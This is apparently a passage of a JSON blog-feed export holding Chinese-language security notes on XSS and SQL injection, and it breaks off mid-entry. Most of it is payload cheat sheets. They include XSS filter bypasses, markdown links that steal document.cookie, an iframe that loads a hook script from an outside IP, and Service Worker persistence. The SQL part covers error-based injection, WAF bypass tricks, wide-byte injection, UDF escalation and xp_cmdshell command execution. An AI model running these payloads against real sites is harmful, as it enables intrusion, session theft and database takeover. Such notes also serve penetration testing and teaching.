<code>&lt;/script&gt;</code></li>\n<li><code>&lt;script&gt;(alert)(1)&lt;/script&gt;</code></li>\n<li><code>&lt;script&gt;a=alert,a(1)&lt;/script&gt;</code></li>\n<li><code>&lt;script&gt;[1].find(alert)&lt;/script&gt;</code></li>\n<li><code>&lt;script&gt;top[&quot;al&quot;+&quot;ert&quot;](1)&lt;/script&gt;</code></li>\n<li><code>&lt;script&gt;top[&quot;a&quot;+&quot;l&quot;+&quot;e&quot;+&quot;r&quot;+&quot;t&quot;](1)&lt;/script&gt;</code></li>\n<li><code>&lt;script&gt;top[/al/.source+/ert/.source](1)&lt;/script&gt;</code></li>\n<li><code>&lt;script&gt;top[/a/.source+/l/.source+/e/.source+/r/.source+/t/.source](1)&lt;/script&gt;</code></li>\n</ul>\n<h2 id=\"伪协议\"><a class=\"anchor\" href=\"#伪协议\">#</a> 伪协议</h2>\n<ul>\n<li><code>&lt;a href=javascript:/0/,alert(%22M%22)&gt;M&lt;/a&gt;</code></li>\n<li><code>&lt;a href=javascript:/00/,alert(%22M%22)&gt;M&lt;/a&gt;</code></li>\n<li><code>&lt;a href=javascript:/000/,alert(%22M%22)&gt;M&lt;/a&gt;</code></li>\n<li><code>&lt;a href=javascript:/M/,alert(%22M%22)&gt;M&lt;/a&gt;</code></li>\n</ul>\n<h2 id=\"chrome-xss-auditor-bypass\"><a class=\"anchor\" href=\"#chrome-xss-auditor-bypass\">#</a> Chrome XSS auditor bypass</h2>\n<ul>\n<li><code>?param=https://&amp;param=@z.exeye.io/import%20rel=import%3E</code></li>\n<li><code>&lt;base href=javascript:/M/&gt;&lt;a href=,alert(1)&gt;M&lt;/a&gt;</code></li>\n<li><code>&lt;base href=javascript:/M/&gt;&lt;iframe src=,alert(1)&gt;&lt;/iframe&gt;</code></li>\n</ul>\n<h2 id=\"长度限制\"><a class=\"anchor\" href=\"#长度限制\">#</a> 长度限制</h2>\n<pre><code>&lt;script&gt;s+=&quot;l&quot;&lt;/script&gt;\n\\...\n&lt;script&gt;eval(s)&lt;/script&gt;\n</code></pre>\n<h2 id=\"jquery-sourcemappingurl\"><a class=\"anchor\" href=\"#jquery-sourcemappingurl\">#</a> jquery sourceMappingURL</h2>\n<pre><code>&lt;/textarea&gt;&lt;script&gt;var a=1//@ sourceMappingURL=//xss.site&lt;/script&gt;\n</code></pre>\n<h2 id=\"图片名\"><a class=\"anchor\" href=\"#图片名\">#</a> 图片名</h2>\n<pre><code>&quot;&gt;&lt;img src=x onerror=alert(document.cookie)&gt;.gif\n</code></pre>\n<h2 id=\"过期的payload\"><a class=\"anchor\" href=\"#过期的payload\">#</a> 过期的 payload</h2>\n<ul>\n<li>src=javascript:alert 基本不可以用</li>\n<li>css expression 特性只在旧版本 ie 可用</li>\n</ul>\n<h2 id=\"css\"><a class=\"anchor\" href=\"#css\">#</a> css</h2>\n<pre><code>&lt;div style=&quot;background-image:url(javascript:alert(/xss/))&quot;&gt;\n&lt;STYLE&gt;@import'http://ha.ckers.org/xss.css';&lt;/STYLE&gt;\n</code></pre>\n<h2 id=\"markdown\"><a class=\"anchor\" href=\"#markdown\">#</a> markdown</h2>\n<pre><code>[a](javascript:prompt(document.cookie))\n[a](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))\n&lt;&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;\n![a'&quot;`onerror=prompt(document.cookie)](x)\n[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)\n[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)\n![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)\n</code></pre>\n<h2 id=\"iframe-2\"><a class=\"anchor\" href=\"#iframe-2\">#</a> iframe</h2>\n<pre><code>&lt;iframe onload='\n    var sc   = document.createElement(&quot;scr&quot; + &quot;ipt&quot;);\n    sc.type  = &quot;text/javascr&quot; + &quot;ipt&quot;;\n    sc.src   = &quot;http://1.2.3.4/js/hook.js&quot;;\n    document.body.appendChild(sc);\n    '\n/&gt;\n</code></pre>\n<ul>\n<li><code>&lt;iframe src=javascript:alert(1)&gt;&lt;/iframe&gt;</code></li>\n<li><code>&lt;iframe src=&quot;data:text/html,&lt;iframe src=javascript:alert('M')&gt;&lt;/iframe&gt;&quot;&gt;&lt;/iframe&gt;</code></li>\n<li><code>&lt;iframe src=data:text/html;base64,PGlmcmFtZSBzcmM9amF2YXNjcmlwdDphbGVydCgiTWFubml4Iik+PC9pZnJhbWU+&gt;&lt;/iframe&gt;</code></li>\n<li><code>&lt;iframe srcdoc=&lt;svg/onload=alert(1)&gt;&gt;&lt;/iframe&gt;</code></li>\n<li><code>&lt;iframe src=https://baidu.com width=1366 height=768&gt;&lt;/iframe&gt;</code></li>\n<li><code>&lt;iframe src=javascript:alert(1) width=1366 height=768&gt;&lt;/iframe</code></li>\n</ul>\n<h2 id=\"form\"><a class=\"anchor\" href=\"#form\">#</a> form</h2>\n<ul>\n<li><code>&lt;form action=javascript:alert(1)&gt;&lt;input type=submit&gt;</code></li>\n<li><code>&lt;form&gt;&lt;button formaction=javascript:alert(1)&gt;M</code></li>\n<li><code>&lt;form&gt;&lt;input formaction=javascript:alert(1) type=submit value=M&gt;</code></li>\n<li><code>&lt;form&gt;&lt;input formaction=javascript:alert(1) type=image value=M&gt;</code></li>\n<li><code>&lt;form&gt;&lt;input formaction=javascript:alert(1) type=image src=1&gt;</code></li>\n</ul>\n<h2 id=\"meta\"><a class=\"anchor\" href=\"#meta\">#</a> meta</h2>\n<pre><code>&lt;META HTTP-EQUIV=&quot;Link&quot; Content=&quot;&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet&quot;&gt;\n</code></pre>\n<h1 id=\"持久化\"><a class=\"anchor\" href=\"#持久化\">#</a> 持久化</h1>\n<h2 id=\"基于存储\"><a class=\"anchor\" href=\"#基于存储\">#</a> 基于存储</h2>\n<p>有时候网站会将信息存储在 Cookie 或 localStorage，而因为这些数据一般是网站主动存储的，很多时候没有对 Cookie 或 localStorage 中取出的数据做过滤，会直接将其取出并展示在页面中，甚至存了 JSON 格式的数据时，部分站点存在  <code>eval(data)</code>  之类的调用。因此当有一个 XSS 时，可以把 payload 写入其中，在对应条件下触发。</p>\n<p>在一些条件下，这种利用方式可能因为一些特殊字符造成问题，可以使用  <code>String.fromCharCode</code>  来绕过。</p>\n<h2 id=\"service-worker\"><a class=\"anchor\" href=\"#service-worker\">#</a> Service Worker</h2>\n<p>Service Worker 可以拦截 http 请求，起到类似本地代理的作用，故可以使用 Service Worker Hook 一些请求，在请求中返回攻击代码，以实现持久化攻击的目的。</p>\n<p>在 Chrome 中，可通过  <code>chrome://inspect/#service-workers</code>  来查看 Service Worker 的状态，并进行停止。</p>\n<h2 id=\"appcache\"><a class=\"anchor\" href=\"#appcache\">#</a> AppCache</h2>\n<p>在可控的网络环境下（公共 wifi），可以使用 AppCache 机制，来强制存储一些 Payload，未清除的情况下，用户访问站点时对应的 payload 会一直存在。</p>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<h2 id=\"wiki\"><a class=\"anchor\" href=\"#wiki\">#</a> wiki</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1VsdGltYXRlSGFja2Vycy9Bd2Vzb21lWFNT\">AwesomeXSS</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93M2MuZ2l0aHViLmlvL3dlYmFwcHNlYy1jc3Av\">w3c</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3dpc2VjL2RvbXhzc3dpa2kvd2lraQ==\">dom xss wiki</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb250ZW50LXNlY3VyaXR5LXBvbGljeS5jb20v\">content-security-policy.com</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zaHVicy5pby9leHBsb2l0aW5nLW1hcmtkb3duLXN5bnRheC1hbmQtdGVsZXNjb3BlLXBlcnNpc3RlbnQteHNzLXRocm91Z2gtbWFya2Rvd24tY3ZlLTIwMTQtNTE0NC8=\">markdwon xss</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9icnV0ZWxvZ2ljLmNvbS5ici9ibG9nL2NoZWF0LXNoZWV0Lw==\">xss cheat sheet</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9odG1sNXNlYy5vcmcv\">html5 security cheatsheet</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubmV0c3Bhcmtlci5jb20vd2hpdGVwYXBlci1odHRwLXNlY3VyaXR5LWhlYWRlcnMv\">http security headers</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2N1cmU1My9YU1NDaGFsbGVuZ2VXaWtpL3dpa2k=\">XSSChallengeWiki</span></li>\n</ul>\n<h2 id=\"challenges\"><a class=\"anchor\" href=\"#challenges\">#</a> Challenges</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94c3MtZ2FtZS5hcHBzcG90LmNvbS8=\">XSS Challenge By Google</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3Byb21wdC5tbC8w\">prompt to win</span></li>\n</ul>\n<h2 id=\"css-2\"><a class=\"anchor\" href=\"#css-2\">#</a> CSS</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy50aGVzcGFubmVyLmNvLnVrLzIwMTQvMDMvMjEvcnBvLw==\">rpo</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy56amljbWlzYS5vcmcvaW5kZXgucGhwL2FyY2hpdmVzLzEyNy8=\">rpo 攻击初探</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdXJlc2VjLmNvbS9ibG9nL2FydGljbGUvYmxvZy9SZWFkaW5nLURhdGEtdmlhLUNTUy1JbmplY3Rpb24tMTgwLmh0bWw=\">Reading Data via CSS</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL21rc2Jlbi5sMC5jbS8yMDE1LzEwL2Nzcy1iYXNlZC1hdHRhY2stYWJ1c2luZy11bmljb2RlLXJhbmdlLmh0bWw=\">css based attack abusing unicode range</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zcGVha2VyZGVjay5jb20vbG10X3N3YWxsb3cvY3NzLWluamVjdGlvbi1wbHVzLXBsdXMtamktY3VuLXNob3UtZmEtZmFsc2VnYWktZ3Vhbi10b2R1aS1jZQ==\">css injection</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnNoZWRkb3cueHl6L2Nzcy10aW1pbmctYXR0YWNrLw==\">css timing attack</span></li>\n</ul>\n<h2 id=\"同源策略-2\"><a class=\"anchor\" href=\"#同源策略-2\">#</a> 同源策略</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvZW4tVVMvZG9jcy9XZWIvU2VjdXJpdHkvU2FtZS1vcmlnaW5fcG9saWN5\">Same origin policy</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmVkZWZlbmRlZC5jb20vcGFwZXJzL2NvcnMtc2VjdXJpdHktZ3VpZGU=\">cors security guide</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zcGVha2VyZGVjay5jb20vc2hobmprL2xvZ2ljYWxseS1ieXBhc3NpbmctYnJvd3Nlci1zZWN1cml0eS1ib3VuZGFyaWVz\">logically bypassing browser security boundaries</span></li>\n</ul>\n<h2 id=\"bypass-2\"><a class=\"anchor\" href=\"#bypass-2\">#</a> bypass</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vSm9oYW5uZXNIb3BwZS81NjEyMjc0\">666 lines of xss payload</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21hc2F0b2tpbnVnYXdhL2ZpbHRlcmJ5cGFzcw==\">xss auditor bypass</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vSFRNTC9jaHJvbWUteHNzLWF1ZGl0b3ItYnlwYXNzLWNvbGxlY3Rpb24uaHRtbA==\">xss auditor bypass writeup</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvYmxvZy9ieXBhc3NpbmctY3NwLXVzaW5nLXBvbHlnbG90LWpwZWdz\">bypassing csp using polyglot jpegs</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjanVpY2UuY29tL2J5cGFzcy14c3MtZmlsdGVycy11c2luZy1qYXZhc2NyaXB0LWdsb2JhbC12YXJpYWJsZXMv\">bypass xss filters using javascript global variables</span></li>\n</ul>\n<h2 id=\"持久化-2\"><a class=\"anchor\" href=\"#持久化-2\">#</a> 持久化</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Ryb3BzLndvb3l1bi5vcmcvd2ViLzEwNzk4\">变种 XSS 持久控制 by tig3r</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zYWt1cml0eS5jb20vYmxvZy8yMDE1LzA4LzEzL21pZGRsZWtpdC5odG1s\">Using Appcache and ServiceWorker for Evil</span></li>\n</ul>\n<h2 id=\"tricks\"><a class=\"anchor\" href=\"#tricks\">#</a> Tricks</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2V0aGVyZHJlYW0vc3ctc2Vj\">Service Worker 安全探索</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0V0aGVyRHJlYW0vd2ViLWZyb250ZW5kLW1hZ2lj\">前端黑魔法</span></li>\n</ul>\n",
            "tags": [
                "网络安全",
                "XSS",
                "漏洞"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/SQL/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/SQL/",
            "title": "SQL注入",
            "date_published": "2022-11-26T03:05:09.000Z",
            "content_html": "<h1 id=\"注入分类\"><a class=\"anchor\" href=\"#注入分类\">#</a> 注入分类</h1>\n<h2 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h2>\n<p>SQL 注入是一种代码注入技术，用于攻击数据驱动的应用程序。 在应用程序中，如果没有做恰当的过滤，则可能使得恶意的 SQL 语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。</p>\n<h2 id=\"按技巧分类\"><a class=\"anchor\" href=\"#按技巧分类\">#</a> 按技巧分类</h2>\n<p>根据使用的技巧，SQL 注入类型可分为</p>\n<ul>\n<li>\n<p>盲注</p>\n<ul>\n<li>布尔盲注：只能从应用返回中推断语句执行后的布尔值</li>\n<li>时间盲注：应用没有明确的回显，只能使用特定的时间函数来判断</li>\n</ul>\n</li>\n<li>\n<p>报错注入：应用会显示全部或者部分的报错信息</p>\n</li>\n<li>\n<p>堆叠注入：有的应用可以加入  <code>;</code>  后一次执行多条语句</p>\n</li>\n<li>\n<p>其他</p>\n</li>\n</ul>\n<h2 id=\"按获取数据的方式分类\"><a class=\"anchor\" href=\"#按获取数据的方式分类\">#</a> 按获取数据的方式分类</h2>\n<p>另外也可以根据获取数据的方式分为 3 类</p>\n<h3 id=\"inband\"><a class=\"anchor\" href=\"#inband\">#</a> inband</h3>\n<p>利用 Web 应用来直接获取数据，如报错注入，这类注入都是通过站点的响应或者错误反馈来提取数据。</p>\n<h3 id=\"inference\"><a class=\"anchor\" href=\"#inference\">#</a> inference</h3>\n<p>通过 Web 的一些反映来推断数据，如布尔盲注，也就是我们通俗的盲注， 通过 web 应用的其他改变来推断数据。</p>\n<h3 id=\"out-of-band-oob\"><a class=\"anchor\" href=\"#out-of-band-oob\">#</a> out of band (OOB)</h3>\n<p>通过其他传输方式来获得数据，比如 DNS 解析协议和电子邮件。</p>\n<h1 id=\"注入检测\"><a class=\"anchor\" href=\"#注入检测\">#</a> 注入检测</h1>\n<h2 id=\"常见的注入点\"><a class=\"anchor\" href=\"#常见的注入点\">#</a> 常见的注入点</h2>\n<ul>\n<li>GET/POST/PUT/DELETE 参数</li>\n<li>X-Forwarded-For</li>\n<li>文件名</li>\n</ul>\n<h2 id=\"fuzz注入点\"><a class=\"anchor\" href=\"#fuzz注入点\">#</a> Fuzz 注入点</h2>\n<ul>\n<li><code>'</code>  /  <code>&quot;</code></li>\n<li><code>1/1</code></li>\n<li><code>1/0</code></li>\n<li><code>and 1=1</code></li>\n<li><code>&quot; and &quot;1&quot;=&quot;1</code></li>\n<li><code>and 1=2</code></li>\n<li><code>or 1=1</code></li>\n<li><code>or 1=</code></li>\n<li><code>' and '1'='1</code></li>\n<li><code>+</code>   <code>-</code>   <code>^</code>   <code>*</code>   <code>%</code>   <code>/</code></li>\n<li><code>&lt;&lt;</code>   <code>&gt;&gt;</code>   <code>||</code>   <code>|</code>   <code>&amp;</code>   <code>&amp;&amp;</code></li>\n<li><code>~</code></li>\n<li><code>!</code></li>\n<li><code>@</code></li>\n<li>反引号执行</li>\n</ul>\n<h2 id=\"测试用常量\"><a class=\"anchor\" href=\"#测试用常量\">#</a> 测试用常量</h2>\n<ul>\n<li><code>@@version</code></li>\n<li><code>@@servername</code></li>\n<li><code>@@language</code></li>\n<li><code>@@spid</code></li>\n</ul>\n<h2 id=\"测试列数\"><a class=\"anchor\" href=\"#测试列数\">#</a> 测试列数</h2>\n<p>例如  <code>http://www.foo.com/index.asp?id=12+union+select+null,null--</code>  ，不断增加  <code>null</code>  至不返回</p>\n<h2 id=\"报错注入\"><a class=\"anchor\" href=\"#报错注入\">#</a> 报错注入</h2>\n<ul>\n<li><code>select 1/0</code></li>\n<li><code>select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a</code></li>\n<li><code>extractvalue(1, concat(0x5c,(select user())))</code></li>\n<li><code>updatexml(0x3a,concat(1,(select user())),1)</code></li>\n<li><code>exp(~(SELECT * from(select user())a))</code></li>\n<li><code>ST_LatFromGeoHash((select * from(select * from(select user())a)b))</code></li>\n<li><code>GTID_SUBSET(version(), 1)</code></li>\n</ul>\n<h3 id=\"基于geometric的报错注入\"><a class=\"anchor\" href=\"#基于geometric的报错注入\">#</a> 基于 geometric 的报错注入</h3>\n<ul>\n<li><code>GeometryCollection((select * from (select * from(select user())a)b))</code></li>\n<li><code>polygon((select * from(select * from(select user())a)b))</code></li>\n<li><code>multipoint((select * from(select * from(select user())a)b))</code></li>\n<li><code>multilinestring((select * from(select * from(select user())a)b))</code></li>\n<li><code>LINESTRING((select * from(select * from(select user())a)b))</code></li>\n<li><code>multipolygon((select * from(select * from(select user())a)b))</code></li>\n</ul>\n<p>其中需要注意的是，基于 exp 函数的报错注入在 MySQL 5.5.49 后的版本已经不再生效，具体可以参考这个 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL215c3FsL215c3FsLXNlcnZlci9jb21taXQvOTU4MjVmYTI4YTdlODRhMmY1ZGJkZWY1MjQxMDc4ZjcwNTVjNWIwNA==\">commit 95825f</span> 。</p>\n<p>而以上列表中基于 geometric 的报错注入在这个 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL215c3FsL215c3FsLXNlcnZlci9jb21taXQvNWNhZWE0YTk5NTEzMGNkN2M4MjU3NGFjYzU5MWZmN2M0NmQ5ZDk3OA==\">commit 5caea4</span> 中被修复，在 5.5.x 较后的版本中同样不再生效。</p>\n<h2 id=\"堆叠注入\"><a class=\"anchor\" href=\"#堆叠注入\">#</a> 堆叠注入</h2>\n<ul>\n<li><code>;select 1</code></li>\n</ul>\n<h2 id=\"注释符\"><a class=\"anchor\" href=\"#注释符\">#</a> 注释符</h2>\n<ul>\n<li><code>#</code></li>\n<li><code>--+</code></li>\n<li><code>/*xxx*/</code></li>\n<li><code>/*!xxx*/</code></li>\n<li><code>/*!50000xxx*/</code></li>\n</ul>\n<h2 id=\"判断过滤规则\"><a class=\"anchor\" href=\"#判断过滤规则\">#</a> 判断过滤规则</h2>\n<ul>\n<li>是否有 trunc</li>\n<li>是否过滤某个字符</li>\n<li>是否过滤关键字</li>\n<li>slash 和编码</li>\n</ul>\n<h2 id=\"获取信息\"><a class=\"anchor\" href=\"#获取信息\">#</a> 获取信息</h2>\n<ul>\n<li>\n<p>判断数据库类型</p>\n<ul>\n<li><code>and exists (select * from msysobjects ) &gt; 0</code>  access 数据库</li>\n<li><code>and exists (select * from sysobjects ) &gt; 0</code>  SQLServer 数据库</li>\n</ul>\n</li>\n<li>\n<p>判断数据库表</p>\n<ul>\n<li><code>and exsits (select * from admin)</code></li>\n</ul>\n</li>\n<li>\n<p>版本、主机名、用户名、库名</p>\n</li>\n<li>\n<p>表和字段</p>\n<ul>\n<li>\n<p>确定字段数</p>\n<ul>\n<li>\n<p>Order By</p>\n</li>\n<li>\n<p>Select Into</p>\n</li>\n</ul>\n</li>\n<li>\n<p>表名、列名</p>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"测试权限\"><a class=\"anchor\" href=\"#测试权限\">#</a> 测试权限</h2>\n<ul>\n<li>文件操作\n<ul>\n<li>读敏感文件</li>\n<li>写 shell</li>\n</ul>\n</li>\n<li>带外通道\n<ul>\n<li>网络请求</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"权限提升\"><a class=\"anchor\" href=\"#权限提升\">#</a> 权限提升</h1>\n<h2 id=\"udf提权\"><a class=\"anchor\" href=\"#udf提权\">#</a> UDF 提权</h2>\n<p>UDF（User Defined Function，用户自定义函数）是 MySQL 提供的一个功能，可以通过编写 DLL 扩展为 MySQL 添加新函数，扩充其功能。</p>\n<p>当获得 MySQL 权限之后，即可通过这种方式上传自定义的扩展文件，从 MySQL 中执行系统命令。</p>\n<h1 id=\"数据库检测\"><a class=\"anchor\" href=\"#数据库检测\">#</a> 数据库检测</h1>\n<h2 id=\"mysql\"><a class=\"anchor\" href=\"#mysql\">#</a> MySQL</h2>\n<ul>\n<li>sleep  <code>sleep(1)</code></li>\n<li>benchmark  <code>BENCHMARK(5000000, MD5('test'))</code></li>\n<li>字符串连接\n<ul>\n<li><code>SELECT 'a' 'b'</code></li>\n<li><code>SELECT CONCAT('some','string')</code></li>\n</ul>\n</li>\n<li>version\n<ul>\n<li><code>SELECT @@version</code></li>\n<li><code>SELECT version()</code></li>\n</ul>\n</li>\n<li>识别用函数\n<ul>\n<li><code>connection_id()</code></li>\n<li><code>last_insert_id()</code></li>\n<li><code>row_count()</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"oracle\"><a class=\"anchor\" href=\"#oracle\">#</a> Oracle</h2>\n<ul>\n<li>字符串连接\n<ul>\n<li><code>'a'||'oracle' --</code></li>\n<li><code>SELECT CONCAT('some','string')</code></li>\n</ul>\n</li>\n<li>version\n<ul>\n<li><code>SELECT banner FROM v$version</code></li>\n<li><code>SELECT banner FROM v$version WHERE rownum=1</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"sqlserver\"><a class=\"anchor\" href=\"#sqlserver\">#</a> SQLServer</h2>\n<ul>\n<li>WAITFOR  <code>WAITFOR DELAY '00:00:10';</code></li>\n<li>SERVERNAME  <code>SELECT @@SERVERNAME</code></li>\n<li>version  <code>SELECT @@version</code></li>\n<li>字符串连接\n<ul>\n<li><code>SELECT 'some'+'string'</code></li>\n</ul>\n</li>\n<li>常量\n<ul>\n<li><code>@@pack_received</code></li>\n<li><code>@@rowcount</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"postgresql\"><a class=\"anchor\" href=\"#postgresql\">#</a> PostgreSQL</h2>\n<ul>\n<li>sleep  <code>pg_sleep(1)</code></li>\n</ul>\n<h1 id=\"绕过技巧\"><a class=\"anchor\" href=\"#绕过技巧\">#</a> 绕过技巧</h1>\n<ul>\n<li>\n<p>编码绕过</p>\n<ul>\n<li>大小写</li>\n<li>url 编码</li>\n<li>html 编码</li>\n<li>十六进制编码</li>\n<li>unicode 编码</li>\n</ul>\n</li>\n<li>\n<p>注释</p>\n<ul>\n<li><code>//</code>   <code>--</code>   <code>-- +</code>   <code>-- -</code>   <code>#</code>   <code>/**/</code>   <code>;%00</code></li>\n<li>内联注释用的更多，它有一个特性  <code>/!**/</code>  只有 MySQL 能识别</li>\n<li>e.g.  <code>index.php?id=-1 /*!UNION*/ /*!SELECT*/ 1,2,3</code></li>\n</ul>\n</li>\n<li>\n<p>只过滤了一次时</p>\n<ul>\n<li><code>union</code>  =&gt;  <code>ununionion</code></li>\n</ul>\n</li>\n<li>\n<p>相同功能替换</p>\n<ul>\n<li>函数替换\n<ul>\n<li><code>substring</code>  /  <code>mid</code>  /  <code>sub</code></li>\n<li><code>ascii</code>  /  <code>hex</code>  /  <code>bin</code></li>\n<li><code>benchmark</code>  /  <code>sleep</code></li>\n</ul>\n</li>\n<li>变量替换\n<ul>\n<li><code>user()</code>  /  <code>@@user</code></li>\n</ul>\n</li>\n<li>符号和关键字\n<ul>\n<li><code>and</code>  / `&amp;``</li>\n<li><code>or</code>  /  <code>|</code></li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p>HTTP 参数</p>\n<ul>\n<li>HTTP 参数污染\n<ul>\n<li><code>id=1&amp;id=2&amp;id=3</code>  根据容器不同会有不同的结果</li>\n</ul>\n</li>\n<li>HTTP 分割注入</li>\n</ul>\n</li>\n<li>\n<p>缓冲区溢出</p>\n<ul>\n<li>一些 C 语言的 WAF 处理的字符串长度有限，超出某个长度后的 payload 可能不会被处理</li>\n</ul>\n</li>\n<li>\n<p>二次注入有长度限制时，通过多句执行的方法改掉数据库该字段的长度绕过</p>\n</li>\n</ul>\n<h1 id=\"sql注入小技巧\"><a class=\"anchor\" href=\"#sql注入小技巧\">#</a> SQL 注入小技巧</h1>\n<h2 id=\"宽字节注入\"><a class=\"anchor\" href=\"#宽字节注入\">#</a> 宽字节注入</h2>\n<p>一般程序员用 gbk 编码做开发的时候，会用  <code>set names 'gbk'</code>  来设定，这句话等同于</p>\n<pre><code>set\ncharacter_set_connection = 'gbk',\ncharacter_set_result = 'gbk',\ncharacter_set_client = 'gbk';\n</code></pre>\n<p>漏洞发生的原因是执行了  <code>set character_set_client = 'gbk';</code>  之后，mysql 就会认为客户端传过来的数据是 gbk 编码的，从而使用 gbk 去解码，而 mysql_real_escape 是在解码前执行的。但是直接用  <code>set names 'gbk'</code>  的话 real_escape 是不知道设置的数据的编码的，就会加  <code>%5c</code>  。此时 server 拿到数据解码 就认为提交的字符 +%5c 是 gbk 的一个字符，这样就产生漏洞了。</p>\n<p>解决的办法有三种，第一种是把 client 的 charset 设置为 binary，就不会做一次解码的操作。第二种是是  <code>mysql_set_charset('gbk')</code>  ，这里就会把编码的信息保存在和数据库的连接里面，就不会出现这个问题了。 第三种就是用 pdo。</p>\n<p>还有一些其他的编码技巧，比如 latin 会弃掉无效的 unicode，那么 admin%32 在代码里面不等于 admin，在数据库比较会等于 admin。</p>\n<h1 id=\"cheatsheet\"><a class=\"anchor\" href=\"#cheatsheet\">#</a> CheatSheet</h1>\n<h2 id=\"sql-server-payload\"><a class=\"anchor\" href=\"#sql-server-payload\">#</a> SQL Server Payload</h2>\n<h3 id=\"常见payload\"><a class=\"anchor\" href=\"#常见payload\">#</a> 常见 Payload</h3>\n<ul>\n<li>\n<p>Version</p>\n<ul>\n<li><code>SELECT @@version</code></li>\n<li><code>SELECT SERVERPROPERTY('Edition');</code></li>\n<li><code>SELECT SERVERPROPERTY('EngineEdition');</code></li>\n</ul>\n</li>\n<li>\n<p>Comment</p>\n<ul>\n<li><code>SELECT 1 -- comment</code></li>\n<li><code>SELECT /*comment*/1</code></li>\n</ul>\n</li>\n<li>\n<p>Space</p>\n<ul>\n<li><code>0x01 - 0x20</code></li>\n</ul>\n</li>\n<li>\n<p>用户信息</p>\n<ul>\n<li><code>SELECT user_name()</code></li>\n<li>``SELECT system_user`</li>\n<li><code>SELECT user</code></li>\n<li><code>SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID</code></li>\n</ul>\n</li>\n<li>\n<p>用户权限</p>\n<ul>\n<li><code>select IS_SRVROLEMEMBER('sysadmin')</code></li>\n<li><code>select IS_SRVROLEMEMBER('db_owner')</code></li>\n</ul>\n</li>\n<li>\n<p>List User</p>\n<p><code>SELECT name FROM master..syslogins</code></p>\n</li>\n<li>\n<p>数据库信息</p>\n<ul>\n<li><code>SELECT name FROM master..sysdatabases</code></li>\n<li><code>select concat_ws(table_schema,table_name,column_name) from information_schema.columns</code></li>\n<li><code>select quotename(name) from master..sysdatabases FOR XML PATH('')</code></li>\n</ul>\n</li>\n<li>\n<p>执行命令</p>\n<ul>\n<li><code>EXEC xp_cmdshell 'net user'</code></li>\n</ul>\n</li>\n<li>\n<p>Ascii</p>\n<ul>\n<li><code>SELECT char(0x41)</code></li>\n<li><code>SELECT ascii('A')</code></li>\n<li><code>SELECT char(65)+char(66)</code>  =&gt; return  <code>AB</code></li>\n</ul>\n</li>\n<li>\n<p>Delay</p>\n<ul>\n<li><code>WAITFOR DELAY 